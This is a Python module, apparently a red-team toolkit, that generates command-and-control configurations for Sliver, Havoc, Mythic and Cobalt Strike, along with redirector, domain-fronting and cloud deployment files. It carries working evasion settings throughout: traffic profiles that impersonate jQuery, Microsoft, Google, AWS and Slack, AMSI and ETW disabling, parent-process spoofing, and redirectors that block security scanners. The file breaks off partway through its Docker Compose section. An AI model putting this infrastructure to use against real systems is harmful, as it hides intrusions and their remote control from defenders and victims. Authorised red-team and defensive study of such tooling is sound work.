"""
C2 Configuration Generator - Red Team Infrastructure Toolkit

This module generates configurations for legitimate C2 frameworks:
- Sliver implant configurations
- Havoc C2 profiles
- Mythic agent configs
- Cobalt Strike malleable profiles
- Infrastructure-as-Code deployments (Terraform, Ansible, Docker)
- Redirector configurations (nginx, Apache, Caddy)

NOTE: This is a CONFIGURATION GENERATOR, not a C2 framework.
It produces config files for existing red team tools used in
authorized penetration testing engagements.

For actual C2 operations, use:
- Sliver (https://github.com/BishopFox/sliver)
- Havoc (https://github.com/HavocFramework/Havoc)
- Mythic (https://github.com/its-a-feature/Mythic)
- Cobalt Strike (commercial)

Based on modern red team infrastructure practices.
"""

import base64
import hashlib
import json
import os
import random
import secrets
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import List, Dict, Optional, Any, Tuple
import string


class C2Framework(Enum):
    """Supported C2 frameworks for config generation."""
    SLIVER = "sliver"
    HAVOC = "havoc"
    MYTHIC = "mythic"
    COBALT_STRIKE = "cobalt_strike"
    CUSTOM = "custom"


class C2Protocol(Enum):
    """C2 communication protocols."""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    DNS_OVER_HTTPS = "doh"
    MTLS = "mtls"
    WIREGUARD = "wireguard"
    TCP = "tcp"
    WEBSOCKET = "websocket"
    SMB = "smb"
    NAMED_PIPE = "named_pipe"


class ImplantOS(Enum):
    """Target operating systems for implants."""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "darwin"
    BSD = "freebsd"


class ImplantArch(Enum):
    """Target architectures."""
    AMD64 = "amd64"
    X86 = "386"
    ARM64 = "arm64"
    ARM = "arm"


@dataclass
class MalleableProfile:
    """
    Malleable C2 profile for traffic shaping.
    Compatible with Cobalt Strike and adaptable for other C2s.
    """
    name: str
    description: str

    # HTTP settings
    http_get_uri: List[str] = field(default_factory=lambda: ["/updates", "/news"])
    http_post_uri: List[str] = field(default_factory=lambda: ["/submit", "/api"])

    # Headers
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    headers: Dict[str, str] = field(default_factory=dict)

    # Request/Response transforms
    client_metadata_transform: List[str] = field(default_factory=lambda: ["base64"])
    client_output_transform: List[str] = field(default_factory=lambda: ["base64"])
    server_output_transform: List[str] = field(default_factory=lambda: ["base64"])

    # Data wrapping
    prepend_data: str = ""
    append_data: str = ""

    # Timing
    jitter: int = 20  # Percentage
    sleep_time: int = 60  # Seconds

    # SSL/TLS
    ssl_cert_cn: str = ""
    ssl_cert_org: str = ""

    # Process injection (for CS)
    spawn_to_x86: str = "%windir%\\syswow64\\rundll32.exe"
    spawn_to_x64: str = "%windir%\\sysnative\\rundll32.exe"

    def to_cobalt_strike_profile(self) -> str:
        """Generate Cobalt Strike malleable C2 profile."""
        profile = f'''
# Malleable C2 Profile: {self.name}
# {self.description}
# Generated by Aegis C2 Config Generator

set sleeptime "{self.sleep_time * 1000}";
set jitter "{self.jitter}";
set useragent "{self.user_agent}";

set sample_name "{self.name}";

# Process Injection
set spawnto_x86 "{self.spawn_to_x86}";
set spawnto_x64 "{self.spawn_to_x64}";

# HTTP GET
http-get {{
    set uri "{" ".join(self.http_get_uri)}";

    client {{
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Accept-Encoding" "gzip, deflate";
'''
        # Add custom headers
        for key, value in self.headers.items():
            profile += f'        header "{key}" "{value}";\n'

        profile += '''
        metadata {
'''
        # Add transforms
        for transform in self.client_metadata_transform:
            if transform == "base64":
                profile += "            base64;\n"
            elif transform == "base64url":
                profile += "            base64url;\n"
            elif transform == "netbios":
                profile += "            netbios;\n"

        if self.prepend_data:
            profile += f'            prepend "{self.prepend_data}";\n'
        if self.append_data:
            profile += f'            append "{self.append_data}";\n'

        profile += '''            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/octet-stream";
        header "Cache-Control" "no-cache";

        output {
'''
        for transform in self.server_output_transform:
            if transform == "base64":
                profile += "            base64;\n"

        profile += '''            print;
        }
    }
}

# HTTP POST
http-post {
'''
        profile += f'    set uri "{" ".join(self.http_post_uri)}";\n'
        profile += '''
    client {
        header "Content-Type" "application/octet-stream";

        id {
            base64;
            header "X-Request-ID";
        }

        output {
'''
        for transform in self.client_output_transform:
            if transform == "base64":
                profile += "            base64;\n"

        profile += '''            print;
        }
    }

    server {
        header "Content-Type" "application/octet-stream";

        output {
            base64;
            print;
        }
    }
}

# SSL Certificate
https-certificate {
'''
        if self.ssl_cert_cn:
            profile += f'    set CN "{self.ssl_cert_cn}";\n'
        if self.ssl_cert_org:
            profile += f'    set O "{self.ssl_cert_org}";\n'

        profile += '''    set validity "365";
}

# Post Exploitation
post-ex {
    set spawnto_x86 "%windir%\\\\syswow64\\\\rundll32.exe";
    set spawnto_x64 "%windir%\\\\sysnative\\\\rundll32.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
}
'''
        return profile


# Pre-defined malleable profiles mimicking legitimate traffic
MALLEABLE_PROFILES = {
    "jquery": MalleableProfile(
        name="jQuery CDN",
        description="Mimics jQuery CDN requests",
        http_get_uri=["/jquery-3.6.0.min.js", "/jquery-ui.min.js", "/jquery.validate.min.js"],
        http_post_uri=["/jquery.min.map", "/jquery-ui.min.map"],
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        headers={
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://code.jquery.com/",
            "Origin": "https://code.jquery.com",
        },
        prepend_data="/*! jQuery v3.6.0 | (c) OpenJS Foundation | jquery.org/license */",
        append_data="//# sourceMappingURL=jquery.min.map",
        ssl_cert_cn="code.jquery.com",
        ssl_cert_org="OpenJS Foundation",
    ),
    "office365": MalleableProfile(
        name="Office 365",
        description="Mimics Office 365 traffic",
        http_get_uri=["/owa/", "/EWS/Exchange.asmx", "/autodiscover/autodiscover.xml", "/mapi/emsmdb/"],
        http_post_uri=["/owa/service.svc", "/EWS/Exchange.asmx", "/mapi/nspi/"],
        user_agent="Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.14326; Pro)",
        headers={
            "Content-Type": "text/xml; charset=utf-8",
            "X-ClientApp": "Outlook",
            "X-OWA-ClientBuildVersion": "16.0.14326.21572",
        },
        ssl_cert_cn="outlook.office365.com",
        ssl_cert_org="Microsoft Corporation",
    ),
    "google_apis": MalleableProfile(
        name="Google APIs",
        description="Mimics Google API traffic",
        http_get_uri=["/complete/search", "/s", "/gen_204", "/client_204"],
        http_post_uri=["/log", "/gsi/_/signin", "/v1/sessions"],
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        headers={
            "Accept": "application/json",
            "Origin": "https://www.google.com",
            "X-Goog-Api-Key": "AIzaSy...",
        },
        ssl_cert_cn="apis.google.com",
        ssl_cert_org="Google LLC",
    ),
    "amazon_aws": MalleableProfile(
        name="Amazon AWS",
        description="Mimics AWS API traffic",
        http_get_uri=["/latest/meta-data/", "/latest/api/token", "/_ping"],
        http_post_uri=["/", "/api/", "/invoke"],
        user_agent="aws-sdk-python/1.26.0 Python/3.9.0 Windows/10",
        headers={
            "Content-Type": "application/x-amz-json-1.1",
            "X-Amz-Target": "AWSCognitoIdentityService.GetId",
        },
        client_metadata_transform=["base64"],
        ssl_cert_cn="amazonaws.com",
        ssl_cert_org="Amazon.com, Inc.",
    ),
    "slack": MalleableProfile(
        name="Slack",
        description="Mimics Slack API traffic",
        http_get_uri=["/api/rtm.connect", "/api/users.list", "/api/channels.list"],
        http_post_uri=["/api/chat.postMessage", "/api/files.upload"],
        user_agent="Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)",
        headers={
            "Content-Type": "application/json; charset=utf-8",
            "Authorization": "Bearer xoxb-...",
        },
        ssl_cert_cn="slack.com",
        ssl_cert_org="Slack Technologies, LLC",
    ),
    "microsoft_update": MalleableProfile(
        name="Windows Update",
        description="Mimics Windows Update traffic",
        http_get_uri=["/v9/windowsupdate/", "/microsoftupdate/v6/", "/selfupdate/"],
        http_post_uri=["/reportingwebservice/", "/clientwebservice/"],
        user_agent="Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.50",
        headers={
            "Content-Type": "application/soap+xml; charset=utf-8",
        },
        ssl_cert_cn="update.microsoft.com",
        ssl_cert_org="Microsoft Corporation",
    ),
}


@dataclass
class SliverConfig:
    """Sliver C2 implant configuration."""
    name: str
    target_os: ImplantOS = ImplantOS.WINDOWS
    target_arch: ImplantArch = ImplantArch.AMD64

    # Connection settings
    mtls_server: str = ""
    mtls_port: int = 8888
    http_server: str = ""
    http_port: int = 443
    dns_server: str = ""
    dns_domain: str = ""
    wg_server: str = ""
    wg_port: int = 53

    # Behavior
    reconnect_interval: int = 60
    max_errors: int = 10
    poll_timeout: int = 360

    # Evasion
    debug: bool = False
    evasion: bool = True
    skip_symbols: bool = True
    disable_sgn: bool = False

    # Format
    format: str = "exe"  # exe, shared, shellcode, service

    def generate_implant_command(self) -> str:
        """Generate Sliver generate command."""
        cmd = ["generate"]

        # OS and Arch
        cmd.append(f"--os {self.target_os.value}")
        cmd.append(f"--arch {self.target_arch.value}")

        # C2 channels
        if self.mtls_server:
            cmd.append(f"--mtls {self.mtls_server}:{self.mtls_port}")

        if self.http_server:
            cmd.append(f"--http {self.http_server}:{self.http_port}")

        if self.dns_server and self.dns_domain:
            cmd.append(f"--dns {self.dns_domain}")

        if self.wg_server:
            cmd.append(f"--wg {self.wg_server}:{self.wg_port}")

        # Timing
        cmd.append(f"--reconnect {self.reconnect_interval}s")
        cmd.append(f"--max-errors {self.max_errors}")
        cmd.append(f"--poll-timeout {self.poll_timeout}s")

        # Evasion
        if self.evasion:
            cmd.append("--evasion")
        if self.skip_symbols:
            cmd.append("--skip-symbols")
        if not self.disable_sgn:
            cmd.append("--disable-sgn=false")
        if self.debug:
            cmd.append("--debug")

        # Format
        cmd.append(f"--format {self.format}")

        # Name
        cmd.append(f"--name {self.name}")

        return " ".join(cmd)

    def generate_http_c2_config(self) -> Dict:
        """Generate Sliver HTTP C2 configuration."""
        return {
            "implant_config": {
                "name": self.name,
                "GOOS": self.target_os.value,
                "GOARCH": self.target_arch.value,
                "c2": [
                    {
                        "priority": 0,
                        "url": f"https://{self.http_server}:{self.http_port}",
                        "options": {
                            "poll_timeout": self.poll_timeout,
                            "reconnect_interval": self.reconnect_interval,
                        }
                    }
                ],
                "evasion": self.evasion,
                "debug": self.debug,
                "format": self.format,
            }
        }

    def generate_profile_yaml(self) -> str:
        """Generate Sliver HTTP C2 profile YAML."""
        return f'''
# Sliver HTTP C2 Profile
# Generated for: {self.name}

name: "{self.name}_profile"
description: "HTTP C2 profile for {self.name}"

# HTTP Configuration
http:
  # Paths that will respond with implant tasks
  stager_paths:
    - "/jquery-3.6.0.min.js"
    - "/updates.js"

  # Paths for implant data exfil
  exfil_paths:
    - "/api/events"
    - "/submit"

  # Headers to add to responses
  headers:
    Server: "nginx/1.18.0"
    Content-Type: "application/javascript"
    Cache-Control: "max-age=3600"

  # Cookie configuration
  cookies:
    name: "PHPSESSID"
    secure: true
    http_only: true

# Timing
jitter: 20
reconnect: {self.reconnect_interval}
poll_timeout: {self.poll_timeout}

# Evasion
evasion:
  process_name: "svchost.exe"
  parent_spoofing: true
  disable_etw: true
'''


@dataclass
class HavocConfig:
    """Havoc C2 configuration."""
    team_server_host: str
    team_server_port: int = 40056

    # Listener settings
    listener_name: str = "default"
    listener_hosts: List[str] = field(default_factory=list)
    listener_port: int = 443
    listener_protocol: str = "Https"

    # Agent settings
    agent_name: str = "demon"
    agent_sleep: int = 2
    agent_jitter: int = 20
    agent_format: str = "exe"  # exe, dll, shellcode, svc-exe

    # HTTP settings
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    headers: Dict[str, str] = field(default_factory=dict)
    uris: List[str] = field(default_factory=lambda: ["/updates", "/api"])

    # Injection
    injection_technique: str = "Syscall-Indirect"  # or Native, Syscall
    spawn_x64: str = "C:\\Windows\\System32\\notepad.exe"
    spawn_x86: str = "C:\\Windows\\SysWOW64\\notepad.exe"

    def generate_profile(self) -> str:
        """Generate Havoc team server profile."""
        hosts = ", ".join([f'"{h}"' for h in self.listener_hosts]) if self.listener_hosts else f'"{self.team_server_host}"'
        headers_list = ", ".join([f'"{k}: {v}"' for k, v in self.headers.items()]) if self.headers else ''
        uris_list = ", ".join([f'"{u}"' for u in self.uris])

        return f'''
// Havoc C2 Profile
// Generated by Aegis C2 Config Generator

Teamserver {{
    Host = "{self.team_server_host}"
    Port = {self.team_server_port}

    Build {{
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }}
}}

Operators {{
    user "operator1" {{
        Password = "{secrets.token_hex(16)}"
    }}
}}

Listeners {{
    {self.listener_protocol} {{
        Name = "{self.listener_name}"
        Hosts = [{hosts}]
        HostBind = "0.0.0.0"
        PortBind = {self.listener_port}
        PortConn = {self.listener_port}
        Secure = True
        UserAgent = "{self.user_agent}"
        Uris = [{uris_list}]
        Headers = [{headers_list}]

        Response {{
            Headers = [
                "Content-Type: application/json",
                "Server: nginx/1.18.0",
                "Cache-Control: no-cache"
            ]
        }}
    }}
}}

Demon {{
    Sleep = {self.agent_sleep}
    Jitter = {self.agent_jitter}

    Injection {{
        Spawn64 = "{self.spawn_x64}"
        Spawn86 = "{self.spawn_x86}"
    }}
}}
'''

    def generate_agent_command(self) -> str:
        """Generate Havoc agent build command."""
        return f'''
# In Havoc client:
# Payloads -> Generate
#
# Agent: Demon
# Listener: {self.listener_name}
# Format: {self.agent_format}
# Sleep: {self.agent_sleep}s
# Jitter: {self.agent_jitter}%
# Injection: {self.injection_technique}
'''


@dataclass
class MythicConfig:
    """Mythic C2 configuration."""
    server_host: str
    server_port: int = 7443

    # Agent type
    agent_type: str = "apollo"  # apollo, poseidon, medusa, etc.
    agent_os: ImplantOS = ImplantOS.WINDOWS
    agent_arch: ImplantArch = ImplantArch.AMD64

    # C2 Profile
    c2_profile: str = "http"  # http, websocket, dynamichttp
    callback_host: str = ""
    callback_port: int = 443
    callback_interval: int = 10
    callback_jitter: int = 23

    # HTTP settings
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    headers: Dict[str, str] = field(default_factory=dict)

    def generate_payload_config(self) -> Dict:
        """Generate Mythic payload configuration."""
        return {
            "payload_type": self.agent_type,
            "c2_profiles": {
                self.c2_profile: {
                    "callback_host": self.callback_host or self.server_host,
                    "callback_port": self.callback_port,
                    "callback_interval": self.callback_interval,
                    "callback_jitter": self.callback_jitter,
                    "headers": self.headers,
                    "AESPSK": secrets.token_hex(16),
                }
            },
            "build_parameters": {
                "os": self.agent_os.value,
                "arch": self.agent_arch.value,
            }
        }

    def generate_graphql_mutation(self) -> str:
        """Generate Mythic GraphQL mutation for payload creation."""
        return f'''
mutation CreatePayload {{
  createPayload(
    payload_type: "{self.agent_type}"
    c2_profiles: [
      {{
        c2_profile: "{self.c2_profile}"
        c2_profile_parameters: {{
          callback_host: "{self.callback_host or self.server_host}"
          callback_port: {self.callback_port}
          callback_interval: {self.callback_interval}
          callback_jitter: {self.callback_jitter}
        }}
      }}
    ]
    build_parameters: {{
      output: "exe"
    }}
    selected_os: "{self.agent_os.value}"
  ) {{
    status
    error
    uuid
  }}
}}
'''


@dataclass
class Redirector:
    """
    Traffic redirector configuration.
    Acts as a proxy between implants and C2 server.
    """
    id: str
    hostname: str
    ip: str
    protocol: C2Protocol
    port: int
    backend_server: str
    backend_port: int
    ssl_enabled: bool = True
    geo_filter: List[str] = field(default_factory=list)
    ip_whitelist: List[str] = field(default_factory=list)
    block_scanners: bool = True
    active: bool = True

    def generate_nginx_config(self) -> str:
        """Generate nginx configuration for this redirector."""
        ssl_config = ""
        if self.ssl_enabled:
            ssl_config = """
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
"""

        whitelist = ""
        if self.ip_whitelist:
            for ip in self.ip_whitelist:
                whitelist += f"    allow {ip};\n"
            whitelist += "    deny all;\n"

        scanner_block = ""
        if self.block_scanners:
            scanner_block = """
    # Block common scanners and bots
    if ($http_user_agent ~* (bot|crawler|spider|scan|nikto|sqlmap|nmap|masscan|zgrab|nuclei)) {
        return 444;
    }

    # Block empty user agents
    if ($http_user_agent = "") {
        return 444;
    }

    # Block by common scanner headers
    if ($http_x_scanner != "") {
        return 444;
    }
"""

        return f"""
# Redirector configuration for {self.hostname}
# Generated by Aegis C2 Config Generator

server {{
    listen {self.port} {'ssl' if self.ssl_enabled else ''};
    server_name {self.hostname};
{ssl_config}
{whitelist}
{scanner_block}
    location / {{
        proxy_pass {'https' if self.ssl_enabled else 'http'}://{self.backend_server}:{self.backend_port};
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_ssl_verify off;
        proxy_connect_timeout 60s;
        proxy_read_timeout 60s;
        proxy_send_timeout 60s;

        # Hide server info
        proxy_hide_header X-Powered-By;
        proxy_hide_header Server;
    }}

    # Decoy responses for suspicious paths
    location ~ ^/(admin|wp-admin|phpmyadmin|.git|.env) {{
        return 404;
    }}

    # Health check (disable in production)
    location /health {{
        return 200 'OK';
        add_header Content-Type text/plain;
    }}
}}
"""

    def generate_apache_config(self) -> str:
        """Generate Apache configuration for this redirector."""
        ssl_config = ""
        if self.ssl_enabled:
            ssl_config = """
    SSLEngine on
    SSLCertificateFile /etc/apache2/ssl/cert.pem
    SSLCertificateKeyFile /etc/apache2/ssl/key.pem
    SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
"""

        return f"""
# Redirector configuration for {self.hostname}
# Generated by Aegis C2 Config Generator

<VirtualHost *:{self.port}>
    ServerName {self.hostname}
{ssl_config}
    # Proxy settings
    ProxyPreserveHost On
    ProxyPass / {'https' if self.ssl_enabled else 'http'}://{self.backend_server}:{self.backend_port}/
    ProxyPassReverse / {'https' if self.ssl_enabled else 'http'}://{self.backend_server}:{self.backend_port}/

    # Block scanners
    RewriteEngine On
    RewriteCond %{{HTTP_USER_AGENT}} (bot|crawler|spider|scan|nikto|sqlmap|nmap) [NC]
    RewriteRule .* - [F,L]

    # Security headers
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-Frame-Options "DENY"
    Header always unset X-Powered-By
    Header always unset Server

    # Logging
    ErrorLog ${{APACHE_LOG_DIR}}/redirector-error.log
    CustomLog ${{APACHE_LOG_DIR}}/redirector-access.log combined
</VirtualHost>
"""

    def generate_caddy_config(self) -> str:
        """Generate Caddy configuration (auto HTTPS)."""
        return f"""
# Redirector configuration for {self.hostname}
# Caddy auto-manages SSL certificates

{self.hostname} {{
    reverse_proxy {self.backend_server}:{self.backend_port} {{
        header_up Host {{host}}
        header_up X-Real-IP {{remote_host}}
        header_up X-Forwarded-For {{remote_host}}
        header_up X-Forwarded-Proto {{scheme}}
    }}

    # Block scanners
    @blocked {{
        header User-Agent *bot*
        header User-Agent *scanner*
        header User-Agent *nikto*
    }}
    respond @blocked 444

    # Hide server info
    header -Server
    header -X-Powered-By

    # Logging
    log {{
        output file /var/log/caddy/redirector.log
    }}
}}
"""

    def generate_socat_command(self) -> str:
        """Generate socat command for simple port forwarding."""
        if self.ssl_enabled:
            return (f"socat OPENSSL-LISTEN:{self.port},reuseaddr,fork,"
                   f"cert=server.pem,verify=0 "
                   f"TCP:{self.backend_server}:{self.backend_port}")
        else:
            return (f"socat TCP-LISTEN:{self.port},reuseaddr,fork "
                   f"TCP:{self.backend_server}:{self.backend_port}")

    def generate_iptables_rules(self) -> str:
        """Generate iptables rules for port forwarding."""
        return f"""
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Forward traffic from port {self.port} to {self.backend_server}:{self.backend_port}
iptables -t nat -A PREROUTING -p tcp --dport {self.port} -j DNAT --to-destination {self.backend_server}:{self.backend_port}
iptables -t nat -A POSTROUTING -j MASQUERADE

# Allow forwarded traffic
iptables -A FORWARD -p tcp -d {self.backend_server} --dport {self.backend_port} -j ACCEPT
"""


@dataclass
class DomainFrontingConfig:
    """
    Domain fronting configuration.
    """
    cdn_provider: str  # cloudfront, azure, cloudflare, fastly, akamai
    front_domain: str  # High-reputation domain (CDN endpoint)
    actual_domain: str  # Your C2 domain
    host_header: str   # Host header value

    def generate_test_commands(self) -> Dict[str, str]:
        """Generate test commands for domain fronting."""
        return {
            "curl": f'curl -H "Host: {self.host_header}" https://{self.front_domain}/ -v',
            "wget": f'wget --header="Host: {self.host_header}" https://{self.front_domain}/ -O - -q',
            "powershell": f'''
$headers = @{{ "Host" = "{self.host_header}" }}
Invoke-WebRequest -Uri "https://{self.front_domain}/" -Headers $headers
''',
        }

    def get_c2_config(self) -> Dict:
        """Get C2 configuration for domain fronting."""
        return {
            "server": self.front_domain,
            "host_header": self.host_header,
            "actual_host": self.actual_domain,
            "cdn_provider": self.cdn_provider,
            "notes": [
                f"Connect to {self.front_domain} via HTTPS",
                f"Set Host header to {self.host_header}",
                f"CDN will route to {self.actual_domain}",
            ]
        }


class InfrastructureDeployer:
    """
    Infrastructure-as-Code deployment generator.
    """

    def __init__(self, c2_framework: C2Framework = C2Framework.SLIVER):
        self.c2_framework = c2_framework
        self.redirectors: List[Redirector] = []

    def add_redirector(self, hostname: str, ip: str,
                      backend_server: str, backend_port: int,
                      protocol: C2Protocol = C2Protocol.HTTPS,
                      port: int = 443) -> Redirector:
        """Add a redirector to the infrastructure."""
        redirector = Redirector(
            id=str(uuid.uuid4())[:8],
            hostname=hostname,
            ip=ip,
            protocol=protocol,
            port=port,
            backend_server=backend_server,
            backend_port=backend_port,
        )
        self.redirectors.append(redirector)
        return redirector

    def generate_terraform_aws(self) -> str:
        """Generate Terraform configuration for AWS."""
        config = '''
# C2 Infrastructure - AWS
# Generated by Aegis C2 Config Generator
# REVIEW ALL SETTINGS BEFORE DEPLOYMENT

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

variable "aws_region" {
  default = "us-east-1"
}

variable "ssh_key_name" {
  description = "Name of SSH key pair"
}

# VPC for C2 infrastructure
resource "aws_vpc" "c2_vpc" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true

  tags = {
    Name = "c2-vpc"
  }
}

resource "aws_subnet" "c2_subnet" {
  vpc_id                  = aws_vpc.c2_vpc.id
  cidr_block              = "10.0.1.0/24"
  availability_zone       = "${var.aws_region}a"
  map_public_ip_on_launch = true

  tags = {
    Name = "c2-subnet"
  }
}

resource "aws_internet_gateway" "c2_igw" {
  vpc_id = aws_vpc.c2_vpc.id

  tags = {
    Name = "c2-igw"
  }
}

resource "aws_route_table" "c2_rt" {
  vpc_id = aws_vpc.c2_vpc.id

  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.c2_igw.id
  }

  tags = {
    Name = "c2-rt"
  }
}

resource "aws_route_table_association" "c2_rta" {
  subnet_id      = aws_subnet.c2_subnet.id
  route_table_id = aws_route_table.c2_rt.id
}

# Security group for C2 server
resource "aws_security_group" "c2_sg" {
  name        = "c2-security-group"
  description = "Security group for C2 server"
  vpc_id      = aws_vpc.c2_vpc.id

  # SSH from specific IPs only
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["YOUR_IP/32"]  # CHANGE THIS
  }

  # C2 traffic from redirectors only
  ingress {
    from_port       = 8443
    to_port         = 8443
    protocol        = "tcp"
    security_groups = [aws_security_group.redirector_sg.id]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name = "c2-sg"
  }
}

# Security group for redirectors
resource "aws_security_group" "redirector_sg" {
  name        = "redirector-security-group"
  description = "Security group for redirectors"
  vpc_id      = aws_vpc.c2_vpc.id

  ingress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["YOUR_IP/32"]  # CHANGE THIS
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name = "redirector-sg"
  }
}

# C2 Server
resource "aws_instance" "c2_server" {
  ami                    = "ami-0c55b159cbfafe1f0"  # Amazon Linux 2
  instance_type          = "t3.medium"
  key_name               = var.ssh_key_name
  vpc_security_group_ids = [aws_security_group.c2_sg.id]
  subnet_id              = aws_subnet.c2_subnet.id

  root_block_device {
    volume_size = 50
    encrypted   = true
  }

  tags = {
    Name = "c2-server"
  }
}

'''
        # Add redirector instances
        for i, redirector in enumerate(self.redirectors):
            config += f'''
# Redirector {i + 1}
resource "aws_instance" "redirector_{redirector.id}" {{
  ami                    = "ami-0c55b159cbfafe1f0"
  instance_type          = "t3.micro"
  key_name               = var.ssh_key_name
  vpc_security_group_ids = [aws_security_group.redirector_sg.id]
  subnet_id              = aws_subnet.c2_subnet.id

  user_data = <<-EOF
              #!/bin/bash
              amazon-linux-extras install nginx1 -y
              systemctl enable nginx
              # SSL certificate setup would go here
              systemctl start nginx
              EOF

  tags = {{
    Name = "redirector-{redirector.id}"
  }}
}}

resource "aws_eip" "redirector_{redirector.id}_eip" {{
  instance = aws_instance.redirector_{redirector.id}.id
  vpc      = true
}}
'''

        # Outputs
        config += '''
output "c2_server_private_ip" {
  value = aws_instance.c2_server.private_ip
}

output "redirector_public_ips" {
  value = [
'''
        for redirector in self.redirectors:
            config += f'    aws_eip.redirector_{redirector.id}_eip.public_ip,\n'
        config += '''  ]
}
'''
        return config

    def generate_terraform_azure(self) -> str:
        """Generate Terraform configuration for Azure."""
        return '''
# C2 Infrastructure - Azure
# Generated by Aegis C2 Config Generator

terraform {
  required_providers {
    azurerm = {
      source  = "hashicorp/azurerm"
      version = "~> 3.0"
    }
  }
}

provider "azurerm" {
  features {}
}

variable "location" {
  default = "East US"
}

resource "azurerm_resource_group" "c2_rg" {
  name     = "c2-infrastructure"
  location = var.location
}

resource "azurerm_virtual_network" "c2_vnet" {
  name                = "c2-vnet"
  address_space       = ["10.0.0.0/16"]
  location            = azurerm_resource_group.c2_rg.location
  resource_group_name = azurerm_resource_group.c2_rg.name
}

resource "azurerm_subnet" "c2_subnet" {
  name                 = "c2-subnet"
  resource_group_name  = azurerm_resource_group.c2_rg.name
  virtual_network_name = azurerm_virtual_network.c2_vnet.name
  address_prefixes     = ["10.0.1.0/24"]
}

resource "azurerm_network_security_group" "c2_nsg" {
  name                = "c2-nsg"
  location            = azurerm_resource_group.c2_rg.location
  resource_group_name = azurerm_resource_group.c2_rg.name

  security_rule {
    name                       = "SSH"
    priority                   = 100
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "22"
    source_address_prefix      = "YOUR_IP"  # CHANGE THIS
    destination_address_prefix = "*"
  }

  security_rule {
    name                       = "HTTPS"
    priority                   = 110
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "Tcp"
    source_port_range          = "*"
    destination_port_range     = "443"
    source_address_prefix      = "*"
    destination_address_prefix = "*"
  }
}

# Additional resources would be defined here...
'''

    def generate_ansible_playbook(self) -> str:
        """Generate Ansible playbook for infrastructure setup."""
        return '''
---
# C2 Infrastructure Deployment Playbook
# Generated by Aegis C2 Config Generator

- name: Setup C2 Server
  hosts: c2_servers
  become: yes
  vars:
    c2_framework: "sliver"  # or havoc, mythic

  tasks:
    - name: Update system packages
      apt:
        update_cache: yes
        upgrade: dist

    - name: Install required packages
      apt:
        name:
          - docker.io
          - docker-compose
          - nginx
          - certbot
          - python3-certbot-nginx
          - fail2ban
          - ufw
        state: present

    - name: Configure firewall
      ufw:
        rule: allow
        port: "{{ item }}"
        proto: tcp
      loop:
        - "22"
        - "443"
        - "8443"

    - name: Enable firewall
      ufw:
        state: enabled
        policy: deny

    - name: Start and enable Docker
      service:
        name: docker
        state: started
        enabled: yes

- name: Setup Redirectors
  hosts: redirectors
  become: yes

  tasks:
    - name: Update system packages
      apt:
        update_cache: yes

    - name: Install nginx
      apt:
        name: nginx
        state: present

    - name: Deploy nginx configuration
      template:
        src: redirector.nginx.conf.j2
        dest: /etc/nginx/sites-available/redirector.conf
      notify: Restart nginx

    - name: Enable site
      file:
        src: /etc/nginx/sites-available/redirector.conf
        dest: /etc/nginx/sites-enabled/redirector.conf
        state: link
      notify: Restart nginx

    - name: Install certbot
      apt:
        name:
          - certbot
          - python3-certbot-nginx
        state: present

  handlers:
    - name: Restart nginx
      service:
        name: nginx
        state: restarted
'''

    def generate_docker_compose(self, c2_config: Optional[Dict] = None) -> str:
        """Generate Docker Compose configuration."""
        framework = self.c2_framework.value

        if framework == "sliver":
            return '''
# Sliver C2 Docker Compose
